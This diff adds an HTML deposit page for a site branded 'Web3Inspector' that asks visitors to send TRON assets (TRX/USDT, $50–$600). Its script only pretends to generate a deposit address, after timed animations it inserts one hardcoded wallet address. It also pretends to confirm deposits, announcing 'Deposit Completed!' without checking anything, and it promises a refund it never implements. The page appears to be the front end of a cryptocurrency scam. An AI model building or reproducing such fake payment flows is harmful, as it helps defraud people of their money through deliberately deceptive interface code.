@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Deposit</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+    <header>
+        <div class="logo">
+            <h3>Web<span class="c">3</span><span class="s">Inspector</span></h3>
+        </div>
+        <button class="logoutB">Logout</button>
+    </header>
+
+    <section class="notif">
+        <div class="in">
+            After 2 blockchain confirmation deposit will take 1-2 minutes to arive in your account!
+        </div>
+    </section>
+
+    <div class="deposit">
+        <label for="sdf">please send only tron assests (trx/usdt) (min - 50$ / max - 600$)</label>
+        <input id="sdf" type="text" placeholder="no address generated" readonly class="adrf">
+        <button class="gen">Click to generate deposit address</button>
+    </div>
+    <!-- TQwUCmVJHQqWSZsJ7PFUVgA7kbNJATKFiP -->
+
+    <section class="notif">
+        <div class="in">
+            Deposit completed from your side? click deposit done, if still dosn't update , your deposited fund will be
+            refunded in 55s!
+        </div>
+    </section>
+
+    <div class="cd">
+        <button class="done">Deposit Done</button>
+        <button class="contact" onclick="window.location.href = 'https://t.me/web3inspector'">Contact Support</button>
+    </div>
+
+    <footer>
+        <div>
+            <span>Since 2019 All Rights Reserved</span>
+            <span>by DevOps</span>
+        </div>
+    </footer>
+
+    <div class="toast"></div>
+    <script>
+        document.querySelector(".logoutB").addEventListener('click', () => {
+            localStorage.clear();
+            window.location.href = 'https://' + window.location.host;
+        });
+        if (!localStorage.getItem("wallet")) {
+            window.location.href = 'https://' + window.location.host;
+        }
+
+        const gen = document.querySelector(".gen");
+        if (document.querySelector(".adrf").value == "") {
+            gen.addEventListener("click", () => {
+                gen.innerHTML = "Generating..";
+                setTimeout(() => {
+                    gen.classList.add("half");
+                }, 1000);
+                setTimeout(() => {
+                    gen.classList.add("full");
+                    gen.innerHTML = "Generated!";
+                    document.querySelector(".adrf").value = "TQwUCmVJHQqWSZsJ7PFUVgA7kbNJATKFiP";
+                }, 2000);
+            });
+        }
+        else {
+            gen.addEventListener("click", () => {
+                gen.innerHTML = "Generated!";
+                return 0;
+            });
+        }
+        const dones1 = document.querySelector(".done");
+        dones1.addEventListener("click",()=>{
+            if(document.querySelector(".adrf").value){
+                dones1.classList.add("full");
+                dones1.innerHTML = "Checking..";
+                setTimeout(()=>{
+                document.querySelector(".toast").innerHTML = `<span>Deposit Completed!</span>`;
+            },2000);
+            setTimeout(()=>{
+                window.location.href = 'https://'+window.location.host+'/dashboard.html';
+            },4000);
+            }
+            else{
+                document.querySelector(".toast").innerHTML = `<span>Error No Deposit Yet</span>`;
+            }
+        });
+    </script>
+</body>
+
+</html>
